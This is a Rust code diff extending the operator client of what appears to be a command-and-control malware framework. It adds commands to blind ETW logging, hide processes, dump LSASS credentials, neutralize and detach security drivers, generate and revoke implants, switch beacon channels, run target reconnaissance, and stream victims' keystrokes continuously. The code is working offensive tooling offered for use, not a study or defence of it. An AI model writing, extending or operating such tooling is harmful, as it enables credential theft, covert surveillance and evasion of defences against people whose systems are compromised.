@@ -296,6 +296,48 @@ pub enum Cmd {
     /// next worker cycle unconditionally re-fetches). Mirrors TUI's `/sessions
     /// refresh`.
     RefreshSessions,
+    // ---- Kernel daemon ops (P6) — mirror the TUI's `/driver-status`,
+    // `/blind-etw`, `/hide <pid>`, `/dump-lsass <pid>`, `/neutralize <pid>`,
+    // `/detach-mf`. These hit the server-control API (`/api/kernel/*`),
+    // not the per-session task queue.
+    KernelStatus,
+    KernelBlindEtw,
+    KernelHide { pid: u32 },
+    KernelDumpLsass { pid: u32 },
+    KernelNeutralize { pid: u32 },
+    KernelDetachMinifilter,
+    /// T-REX target reconnaissance — enqueued on the session task queue as
+    /// `{"type":"trex"}` (same as the TUI).
+    Trex { session: String },
+    /// Set the beacon's C2 transport channel (numeric id 0-8). Mirrors TUI's
+    /// `/channel <id>`.
+    SetChannel { session: String, channel: u8 },
+    /// `POST /api/generate-implant` — build a per-implant binary. Mirrors TUI's
+    /// `/generate`.
+    GenerateImplant {
+        callback: String,
+        port: u16,
+        format: String,
+        uri: String,
+        sleep: u32,
+        jitter: u8,
+        tls: bool,
+        features: u32,
+    },
+    /// `GET /api/implants` — list all generated implants. Mirrors TUI's
+    /// `/implants`.
+    FetchImplants,
+    /// `POST /api/implant/revoke` — revoke an implant by pubkey. Mirrors TUI's
+    /// `/revoke <pub>`.
+    RevokeImplant { implant_pub: String },
+    /// Start continuous keylog streaming: the worker re-enqueues a
+    /// `keylog action=2` dump task every `interval_secs` until
+    /// `KeylogStreamStop` clears the stream. Mirrors TUI's
+    /// `/keylog stream [secs]`.
+    KeylogStreamStart { session: String, interval_secs: u32 },
+    /// Stop continuous keylog streaming for the given session. Mirrors TUI's
+    /// `/keylog unstream`.
+    KeylogStreamStop { session: String },
     /// Stop the worker loop (app shutdown).
     Shutdown,
 }
@@ -365,6 +407,12 @@ enum TaskKind {
         name: String,
         args: String,
     },
+    /// Continuous keylog dump — re-enqueues itself on completion. The worker's
+    /// `keylog_streaming` state is the single source of truth (so
+    /// `KeylogStreamStop` clears the stream even while a dump task is in
+    /// flight). Output is routed like `Generic("keylog")` — line-by-line to the
+    /// session console.
+    KeylogStream,
 }
 
 /// A task whose result the worker is still polling.
@@ -405,6 +453,12 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
     let mut connecting = false;
     let mut connect_stage = ConnectStage::Idle;
     let mut connect_attempt_time: Option<Instant> = None;
+    // Active continuous keylog stream, if any: `(session, interval_secs)`.
+    // Set by `Cmd::KeylogStreamStart`, cleared by `Cmd::KeylogStreamStop`.
+    // While set, the poll loop ensures a `KeylogStream` dump task is always
+    // pending for that session (re-enqueuing one whenever none remains after
+    // the prior dump finishes). Mirrors the TUI's `keylog_streaming` state.
+    let mut keylog_streaming: Option<(String, u32)> = None;
 
     loop {
         // 0. 20s timeout: if a connect attempt never resolves (dropped
@@ -1415,6 +1469,295 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                     last_session_sig.clear();
                     log_push(&mut log_buf, "sessions: forced refresh");
                 }
+                Cmd::KernelStatus => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match authed(client.get(format!("{srv}/api/kernel/status")), token)
+                        .send()
+                        .await
+                    {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("kernel: {v}")),
+                            Err(e) => log_push(&mut log_buf, &format!("! kernel: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! kernel: {e}")),
+                    }
+                }
+                Cmd::KernelBlindEtw => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match authed(client.post(format!("{srv}/api/kernel/blind-etw")), token)
+                        .send()
+                        .await
+                    {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("blind-etw: {v}")),
+                            Err(e) => log_push(&mut log_buf, &format!("! blind-etw: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! blind-etw: {e}")),
+                    }
+                }
+                Cmd::KernelHide { pid } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match authed(client.post(format!("{srv}/api/kernel/hide?pid={pid}")), token)
+                        .send()
+                        .await
+                    {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("hide {pid}: {v}")),
+                            Err(e) => log_push(&mut log_buf, &format!("! hide: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! hide: {e}")),
+                    }
+                }
+                Cmd::KernelDumpLsass { pid } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match authed(
+                        client.post(format!("{srv}/api/kernel/dump-lsass?pid={pid}")),
+                        token,
+                    )
+                    .send()
+                    .await
+                    {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("dump-lsass {pid}: {v}")),
+                            Err(e) => log_push(&mut log_buf, &format!("! dump-lsass: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! dump-lsass: {e}")),
+                    }
+                }
+                Cmd::KernelNeutralize { pid } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match authed(
+                        client.post(format!("{srv}/api/kernel/neutralize?pid={pid}")),
+                        token,
+                    )
+                    .send()
+                    .await
+                    {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("neutralize {pid}: {v}")),
+                            Err(e) => log_push(&mut log_buf, &format!("! neutralize: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! neutralize: {e}")),
+                    }
+                }
+                Cmd::KernelDetachMinifilter => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match authed(
+                        client.post(format!("{srv}/api/kernel/detach-minifilter")),
+                        token,
+                    )
+                    .send()
+                    .await
+                    {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => log_push(&mut log_buf, &format!("detach-minifilter: {v}")),
+                            Err(e) => log_push(&mut log_buf, &format!("! detach-mf: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! detach-mf: {e}")),
+                    }
+                }
+                Cmd::Trex { session } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    let cmd_json = serde_json::json!({ "type": "trex" });
+                    match enqueue_task(&client, srv, &session, cmd_json, token).await {
+                        Ok(tid) => {
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] T-REX → task {}", short(&session), tid),
+                            );
+                            pending.push(PendingTask {
+                                session,
+                                task_id: tid,
+                                kind: TaskKind::Generic("trex".to_string()),
+                                backoff: Duration::from_secs(5),
+                                last_poll: Instant::now(),
+                            });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! trex: {e}")),
+                    }
+                }
+                Cmd::SetChannel { session, channel } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    let cmd_json =
+                        serde_json::json!({ "type": "setchannel", "channel": channel });
+                    match enqueue_task(&client, srv, &session, cmd_json, token).await {
+                        Ok(tid) => log_push(
+                            &mut log_buf,
+                            &format!("[{}] channel set {channel} → task {}", short(&session), tid),
+                        ),
+                        Err(e) => log_push(&mut log_buf, &format!("! channel: {e}")),
+                    }
+                }
+                Cmd::GenerateImplant {
+                    callback,
+                    port,
+                    format,
+                    uri,
+                    sleep,
+                    jitter,
+                    tls,
+                    features,
+                } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    let body = serde_json::json!({
+                        "callback": callback,
+                        "port": port,
+                        "format": format,
+                        "uri": uri,
+                        "sleep": sleep,
+                        "jitter": jitter,
+                        "tls": tls,
+                        "features": features,
+                    });
+                    match authed(
+                        client
+                            .post(format!("{srv}/api/generate-implant"))
+                            .json(&body),
+                        token,
+                    )
+                    .send()
+                    .await
+                    {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => {
+                                let sha = v["sha256"].as_str().unwrap_or("?");
+                                let pk = v["implant_pub"].as_str().unwrap_or("?");
+                                log_push(
+                                    &mut log_buf,
+                                    &format!("implant generated: pub={pk} sha256={sha}"),
+                                );
+                                log_push(&mut log_buf, &format!("  response: {v}"));
+                            }
+                            Err(e) => {
+                                log_push(&mut log_buf, &format!("! generate-implant: {e}"))
+                            }
+                        },
+                        Err(e) => {
+                            log_push(&mut log_buf, &format!("! generate-implant: {e}"))
+                        }
+                    }
+                }
+                Cmd::FetchImplants => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    match authed(client.get(format!("{srv}/api/implants")), token)
+                        .send()
+                        .await
+                    {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => {
+                                if let Some(implants) = v["implants"].as_array() {
+                                    for imp in implants {
+                                        let pk =
+                                            imp["implant_pub"].as_str().unwrap_or("?");
+                                        let cb =
+                                            imp["callback_host"].as_str().unwrap_or("?");
+                                        let used = imp["auth_token_used"]
+                                            .as_bool()
+                                            .unwrap_or(false);
+                                        let rev = imp["revoked"].as_bool().unwrap_or(false);
+                                        log_push(
+                                            &mut log_buf,
+                                            &format!(
+                                                "implant {pk} → {cb}  used={used} revoked={rev}"
+                                            ),
+                                        );
+                                    }
+                                }
+                                log_push(
+                                    &mut log_buf,
+                                    &format!(
+                                        "{} implants total",
+                                        v["implants"]
+                                            .as_array()
+                                            .map(|a| a.len())
+                                            .unwrap_or(0)
+                                    ),
+                                );
+                            }
+                            Err(e) => log_push(&mut log_buf, &format!("! implants: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! implants: {e}")),
+                    }
+                }
+                Cmd::RevokeImplant { implant_pub } => {
+                    let Some((ref srv, ref token)) = server else {
+                        log_push(&mut log_buf, "! not connected");
+                        continue;
+                    };
+                    let body = serde_json::json!({ "implant_pub": implant_pub });
+                    match authed(
+                        client.post(format!("{srv}/api/implant/revoke")).json(&body),
+                        token,
+                    )
+                    .send()
+                    .await
+                    {
+                        Ok(r) => match r.json::<serde_json::Value>().await {
+                            Ok(v) => {
+                                log_push(&mut log_buf, &format!("revoke {implant_pub}: {v}"))
+                            }
+                            Err(e) => log_push(&mut log_buf, &format!("! revoke: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! revoke: {e}")),
+                    }
+                }
+                Cmd::KeylogStreamStart {
+                    session,
+                    interval_secs,
+                } => {
+                    // Clamp to a 2s floor — anything tighter would flood the
+                    // server with dump tasks and exhaust the result queue.
+                    let interval_secs = interval_secs.max(2);
+                    keylog_streaming = Some((session.clone(), interval_secs));
+                    log_push(
+                        &mut log_buf,
+                        &format!(
+                            "[{}] keylog stream started ({}s)",
+                            short(&session),
+                            interval_secs
+                        ),
+                    );
+                }
+                Cmd::KeylogStreamStop { session } => {
+                    keylog_streaming = None;
+                    // Drop any in-flight KeylogStream task so it doesn't fire one
+                    // final dump after the operator asked to stop.
+                    pending.retain(|t| !matches!(t.kind, TaskKind::KeylogStream));
+                    log_push(
+                        &mut log_buf,
+                        &format!("[{}] keylog stream stopped", short(&session)),
+                    );
+                }
             }
         }
 
@@ -1614,6 +1957,18 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                         }
                         bof_updates.push(BofUpdate { name, args, status });
                     }
+                    // Continuous keylog dump: route line-by-line to the session
+                    // console like Generic. The auto-enqueue loop below keeps
+                    // the stream going while `keylog_streaming` is set.
+                    TaskKind::KeylogStream => {
+                        if !out.is_empty() {
+                            log_push(
+                                &mut log_buf,
+                                &format!("[{}] keylog: {}", short(&session), out),
+                            );
+                            console_lines.push((session.clone(), out));
+                        }
+                    }
                 },
                 Ok(None) => {
                     let next = backoff.saturating_mul(2).min(Duration::from_secs(4));
@@ -1638,6 +1993,37 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
             }
         }
         pending = still_pending;
+
+        // Auto-enqueue the next keylog dump if streaming is active and no dump
+        // task for that session is currently pending. The prior dump (Done) has
+        // just been dropped from `pending`, so this is where the continuous
+        // stream actually loops — the new task sits in the queue until the
+        // beacon polls next, and its result re-enters the routing match on the
+        // next iteration. `backoff` is set to the interval so the first poll
+        // waits the full interval rather than firing immediately. Mirrors the
+        // TUI's keylog-stream re-enqueue block.
+        if let Some((ref kl_session, kl_interval)) = keylog_streaming {
+            let has_pending = pending
+                .iter()
+                .any(|t| t.session == *kl_session && matches!(t.kind, TaskKind::KeylogStream));
+            if !has_pending {
+                let cmd_json = serde_json::json!({ "type": "keylog", "action": 2 });
+                match enqueue_task(&client, srv, kl_session, cmd_json, token).await {
+                    Ok(tid) => {
+                        pending.push(PendingTask {
+                            session: kl_session.clone(),
+                            task_id: tid,
+                            kind: TaskKind::KeylogStream,
+                            // Delay first poll by the interval so dumps are
+                            // spaced `kl_interval` apart rather than hammering.
+                            backoff: Duration::from_secs(kl_interval as u64),
+                            last_poll: Instant::now(),
+                        });
+                    }
+                    Err(e) => log_push(&mut log_buf, &format!("! keylog stream: {e}")),
+                }
+            }
+        }
 
         // Flush any task-result log lines / BOF updates / console lines accumulated this cycle.
         if !log_buf.is_empty() || !bof_updates.is_empty() || !console_lines.is_empty() {
